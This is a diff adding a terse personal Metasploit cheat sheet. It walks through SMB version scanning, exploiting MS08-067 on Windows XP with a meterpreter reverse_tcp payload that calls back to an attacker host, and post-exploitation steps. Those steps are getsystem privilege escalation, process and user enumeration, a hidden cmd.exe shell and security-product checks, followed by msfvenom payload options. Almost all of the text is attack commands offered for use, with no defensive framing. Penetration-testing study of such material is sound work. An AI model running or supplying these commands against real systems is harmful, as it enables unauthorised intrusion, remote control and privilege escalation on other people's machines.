@@ -1,0 +1,55 @@
+MSF STUFF
+
+
+3 - Set MSF PAYLOAD
+	- set rhost 127.0.0.1
+	- set rport 5445
+	- set lport 7979
+	- set lhost 10.0.0.50
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+- METERPRETER ON WINDOWS XP
+	#> msfconsole
+	#> search smb_version
+	#> search type:exploit smb
+	- load scanner
+		#> use auxiliary/scanner/smb/smber_version
+		#> show options
+		#> set rhosts <tgt.ip>
+		#> run
+		#> use exploit/windows/smb/ms08_067_netapi (only works on XP2)
+			#> set payload windows/meterpreter/reverse_tcp
+			#> set lhost <Kali_IP>
+			#> set lport <LPORT_of_Kali>
+			#> set rhost <target-IP>
+			#> set target 4 (or show options; then select target 4)
+			#> exploit
+				- METERPRETER COMMANDS
+				#> For Meterpreter commands:  enter [?]
+				#> getuid 						(privileges)
+				#> getsystem 						(SYSTEM priv accounts)
+				#> sysinfo						(systeminfo)
+				#> getpid 						(processes)
+				#> idletime 						(active users? - relative to privilege level)
+				#> getpid - *look for explorer or rdpclip* 		(evidence of active user)
+				#> search -f <calc*>					(find calculator)
+					- post exploitation scripts:
+					/usr/share/metasploit-framework/scripts/meterpreter 	(kali)
+					/apps/pro/msf3/scripts/meterpreter			(backtrack)
+
+				- Migrate Meterpreter to a SYSTEM level SVCHOST
+					#> shell
+					#> execute -f cmd.exe -i -H
+						-FROM COMMAND PROMPT:  Refer to Windows Cheat sheet
+							#> secedit 			(security products)
+							#> auditpol			(security info)
+							#> copy C:/program files	(programs)
+-msfvenvom
+	#> msfvenom -h
+	#> msfvenom -l <mod_type> 		(list payloads, modules, nops all
+	#> msfvenom -p <payload> -o 	(show opt for payloads)
+	#> msfvenom --help-formats 	(exe,dll, etc)
+
+
+
+
